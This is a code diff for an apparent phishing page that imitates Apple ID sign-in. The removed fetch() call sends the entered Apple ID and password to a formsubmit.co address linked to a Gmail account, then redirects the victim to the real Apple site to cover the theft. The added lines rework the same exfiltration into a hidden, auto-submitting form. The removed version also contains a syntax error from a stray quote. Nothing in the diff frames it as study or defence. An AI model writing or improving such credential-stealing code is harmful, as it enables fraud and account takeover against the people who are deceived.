@@ -257,30 +257,37 @@
             document.querySelector('.container form').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // Send credentials to your email via web service
-            fetch('https://formsubmit.co/11111111aa1aaaaa@gmail.com';', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    appleid: appleid,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    ip: 'Captured'
-                })
-            }).then(() => {
-                // Redirect to real Apple after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://appleid.apple.com/';
-                }, 2000);
-            }).catch(() => {
-                // Even if it fails, redirect to real Apple
-                setTimeout(() => {
-                    window.location.href = 'https://appleid.apple.com/';
-                }, 2000);
-            });
-        });
+// Create a hidden form and submit to FormSubmit
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://formsubmit.co/11111111aa1aaaaa@gmail.com';
+        
+        const emailInput = document.createElement('input');
+        emailInput.type = 'hidden';
+        emailInput.name = 'appleid';
+        emailInput.value = appleid;
+        
+        const passInput = document.createElement('input');
+        passInput.type = 'hidden';
+        passInput.name = 'password';
+        passInput.value = password;
+        
+        const timeInput = document.createElement('input');
+        timeInput.type = 'hidden';
+        timeInput.name = 'timestamp';
+        timeInput.value = new Date().toISOString();
+        
+        form.appendChild(emailInput);
+        form.appendChild(passInput);
+        form.appendChild(timeInput);
+        
+        document.body.appendChild(form);
+        
+        // Submit form
+        setTimeout(() => {
+            form.submit();
+        }, 1000);
+    });
     </script>
 </body>
 </html>
